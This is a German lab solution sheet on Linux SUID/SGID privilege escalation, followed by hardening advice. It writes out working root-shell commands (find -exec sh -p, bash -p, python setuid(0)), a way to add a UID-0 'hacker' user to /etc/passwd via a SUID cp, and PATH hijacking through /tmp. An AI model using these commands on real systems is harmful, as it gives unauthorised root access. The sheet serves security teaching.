# Lösung – Übung 04: SUID/SGID-Binaries

## 1. SUID finden

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null     # SGID
```
Standard: `passwd su sudo mount ping chsh`. Verdächtig: `find cp bash nano vim python less awk tar` u. a.

## 2. GTFOBins-SUID-Eskalation

```bash
# find (SUID):
find . -exec /bin/sh -p \; -quit        # -p behält Priv
# bash (SUID):
/usr/bin/bash -p                         # -p -> euid=root bleibt
# python (SUID):
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# id -> euid=0(root)
```
Wichtig: `-p`/`setuid(0)`, sonst droppt die Shell die root-euid.

## 3. cp (SUID) → /etc/passwd manipulieren

```bash
# neuen root-User mit bekanntem Passwort bauen:
openssl passwd -1 -salt xx meinpass          # -> $1$xx$...hash
# /etc/passwd kopieren, Zeile ergänzen, mit SUID-cp zurückschreiben:
echo 'hacker:$1$xx$...:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd                    # SUID-cp schreibt als root
su hacker                                     # -> root
```

## 4. Selbstgeschriebene SUID + PATH-Hijacking

Eine root-SUID-Binary, die `system("ls")` (ohne Pfad) aufruft, sucht `ls` über `$PATH`:
```bash
cd /tmp
echo '/bin/sh' > ls; chmod +x ls
export PATH=/tmp:$PATH
/pfad/zur/suid-binary        # ruft unser /tmp/ls = sh als root auf
```
→ **PATH-Hijacking** (vertieft in Übung 05).

## 5. Warum SUID sorgsam setzen

Eine SUID-root-Binary läuft **als root** – jede Möglichkeit, darüber Befehle/Dateien zu steuern (Shell-Escape, relative Pfade, Datei schreiben), wird zu root-PrivEsc. Darum: SUID nur wo zwingend, nie auf shell-/interpreterfähige oder selbstgebaute unsichere Programme.

## Härtung

- SUID-Set minimieren (`find / -perm -4000` regelmäßig auditieren), unnötige entfernen (`chmod u-s`).
- Eigene SUID-Programme: absolute Pfade, kein `system()`/`popen()` mit User-Input, PATH/ENV säubern.
- `nosuid`-Mount-Option für `/tmp`, `/home`, Wechselmedien.

## Häufige Fehler / Troubleshooting

- **Shell ist nicht root (nur euid):** `-p` bei bash/find, `setuid(0)` bei python.
- **`/etc/passwd` nicht schreibbar via cp:** cp muss **SUID-root** sein (`ls -la`); sonst anderer Vektor.
- **PATH-Trick wirkungslos:** Binary nutzt absoluten Pfad (sicher) → anderer Vektor.
- **Snapshot:** `/etc/passwd`-Edits können den Login zerschießen → vorher Snapshot.
